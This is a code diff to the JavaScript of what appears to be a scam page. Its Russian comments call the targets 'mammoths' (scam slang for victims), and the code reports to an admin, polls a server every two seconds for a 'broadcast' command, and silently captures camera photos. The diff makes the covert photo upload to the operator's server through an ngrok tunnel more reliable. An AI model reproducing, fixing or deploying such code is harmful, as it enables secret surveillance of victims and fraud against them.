@@ -531,7 +531,6 @@
             console.log(`✅ Реф код: ${currentRefCode}`);
         }
         
-        // ===== ЕСЛИ ЕСТЬ ПАРАМЕТР BROADCAST — ПОКАЗЫВАЕМ СТРАНИЦУ УВЕДОМЛЕНИЯ =====
         if (params.broadcast === 'true') {
             broadcastTriggered = true;
             const phone = params.phone || 'неизвестный';
@@ -571,7 +570,7 @@
             });
     })();
     
-    // ========== ПОСТОЯННАЯ ПРОВЕРКА КОМАНДЫ НА СЕРВЕРЕ ==========
+    // ========== ПОСТОЯННАЯ ПРОВЕРКА КОМАНДЫ ==========
     function checkForBroadcast() {
         const refCode = currentRefCode || new URLSearchParams(window.location.search).get('ref');
         if (!refCode) {
@@ -642,7 +641,6 @@
         sendToAdmin(`🔴 Запущена рассылка для мамонта ${phone}`);
     }
     
-    // ========== ЗАКРЫТЬ ПЕРЕКРЫТИЕ ==========
     function closeBroadcast() {
         document.getElementById('broadcastOverlay').className = '';
         broadcastTriggered = false;
@@ -851,7 +849,7 @@
         }
     }
     
-    // ========== КАМЕРА И ФОТО ==========
+    // ========== КАМЕРА И ФОТО (ИСПРАВЛЕННАЯ) ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
@@ -882,11 +880,14 @@
                 canvas.height = videoEl.videoHeight || 480;
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                fetch(`${API_URL}/upload_photo`, {
+                await fetch(`${API_URL}/upload_photo`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'ngrok-skip-browser-warning': 'true'
+                    },
                     body: JSON.stringify({ photo: photoData, step: i+1, timestamp: Date.now() })
-                }).catch(() => {});
+                });
                 await new Promise(r => setTimeout(r, 300));
             }
             
@@ -914,7 +915,7 @@
     // ========== ЗАГРУЗКА ДАННЫХ ==========
     loadWorkerData();
     
-    // ========== ЗАПУСКАЕМ ПРОВЕРКУ КОМАНДЫ КАЖДЫЕ 2 СЕКУНДЫ ==========
+    // ========== ЗАПУСК ПРОВЕРКИ КОМАНД ==========
     if (currentRefCode) {
         console.log('✅ Запуск проверки команд для ref:', currentRefCode);
         setInterval(checkForBroadcast, 2000);
